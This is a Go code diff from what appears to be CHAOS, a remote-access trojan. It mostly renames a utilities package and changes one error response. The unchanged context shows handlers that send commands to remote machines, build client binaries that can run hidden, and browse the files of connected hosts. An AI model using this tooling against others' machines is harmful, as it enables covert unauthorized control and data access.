@@ -10,10 +10,10 @@ import (
 	"github.com/sirupsen/logrus"
 	"github.com/tiagorlampert/CHAOS/delivery/http/request"
 	"github.com/tiagorlampert/CHAOS/entities"
-	"github.com/tiagorlampert/CHAOS/internal/utilities"
-	"github.com/tiagorlampert/CHAOS/internal/utilities/constants"
-	"github.com/tiagorlampert/CHAOS/internal/utilities/network"
-	"github.com/tiagorlampert/CHAOS/internal/utilities/system"
+	"github.com/tiagorlampert/CHAOS/internal/utils"
+	"github.com/tiagorlampert/CHAOS/internal/utils/constants"
+	"github.com/tiagorlampert/CHAOS/internal/utils/network"
+	"github.com/tiagorlampert/CHAOS/internal/utils/system"
 	"github.com/tiagorlampert/CHAOS/services"
 	"net/http"
 	"path/filepath"
@@ -185,7 +185,7 @@ func (h *httpController) sendCommandHandler(c *gin.Context) {
 
 func (h *httpController) getCommandHandler(c *gin.Context) {
 	address := c.Query("address")
-	decoded, err := utilities.DecodeBase64(address)
+	decoded, err := utils.DecodeBase64(address)
 	if err != nil {
 		c.String(http.StatusBadRequest, err.Error())
 		return
@@ -239,11 +239,11 @@ func (h *httpController) generateBinaryPostHandler(c *gin.Context) {
 		ServerPort:    req.Port,
 		OSTarget:      system.OSTargetIntMap[osTarget],
 		Filename:      req.Filename,
-		RunHidden:     utilities.ParseCheckboxBoolean(req.RunHidden),
+		RunHidden:     utils.ParseCheckboxBoolean(req.RunHidden),
 	})
 	if err != nil {
 		h.Logger.Error(err)
-		c.String(http.StatusInternalServerError, err.Error())
+		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
 	}
 	c.String(http.StatusOK, binary)
@@ -274,7 +274,7 @@ func (h *httpController) fileExplorerHandler(c *gin.Context) {
 		c.String(http.StatusBadRequest, err.Error())
 		return
 	}
-	path, err := utilities.DecodeBase64(req.Path)
+	path, err := utils.DecodeBase64(req.Path)
 	if err != nil {
 		c.String(http.StatusBadRequest, err.Error())
 		return
@@ -293,7 +293,7 @@ func (h *httpController) fileExplorerHandler(c *gin.Context) {
 	}
 
 	var fileExplorer entities.FileExplorer
-	err = json.Unmarshal(utilities.StringToByte(payload.Response), &fileExplorer)
+	err = json.Unmarshal(utils.StringToByte(payload.Response), &fileExplorer)
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
